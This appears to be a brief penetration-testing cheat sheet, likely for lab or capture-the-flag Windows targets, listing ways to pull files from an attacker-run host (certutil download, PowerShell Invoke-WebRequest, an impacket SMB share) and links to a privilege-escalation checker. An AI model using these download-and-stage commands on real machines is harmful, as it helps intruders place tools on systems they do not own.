# Getting a file 
### CMD
``` 
certutil.exe -urlcache -split -f "http://ip:8000/archivo" archivo
```
### Powershell
```
Invoke-WebRequest -Uri http://ip:8000/archivo -OutFile archivo
```
### SMB
Local
```
python Tools/impacket/smbserver.py Tools .
```
Remote
```
copy \\10.10.14.27\Tools\file
```
# Exploit suggesters
### .exe
```
https://github.com/pentestmonkey/windows-privesc-check/blob/master/windows-privesc-check2.exe
```
### Python
```
https://github.com/pentestmonkey/windows-privesc-check/blob/master/windows_privesc_check.py
```
